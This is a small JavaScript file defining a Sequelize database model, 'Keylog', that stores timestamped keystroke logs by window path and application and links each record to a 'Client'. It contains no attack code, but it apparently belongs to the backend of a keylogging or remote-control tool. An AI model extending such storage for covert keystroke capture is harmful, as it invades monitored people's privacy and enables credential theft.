'use strict'

const { Model, DataTypes } = require('sequelize')

class Keylog extends Model { }

Keylog.initialize = function (sequelize) {
    Keylog.init({
        id: { type: DataTypes.INTEGER, autoIncrement: true, primaryKey: true },
        datetime: { type: DataTypes.DATE, allowNull: false, unique: false },
        path: { type: DataTypes.TEXT, allowNull: false, unique: false },
        application: { type: DataTypes.TEXT, allowNull: false, unique: false },
        logs: { type: DataTypes.TEXT, allowNull: false, unique: false }
    },
        {
            sequelize,
            modelName: 'Keylog',
            tableName: 'Keylogs'
        })
}

Keylog.associate = function (models) {

    Keylog.belongsTo(models.Client, { foreignKey: 'clientId' })
}

module.exports = Keylog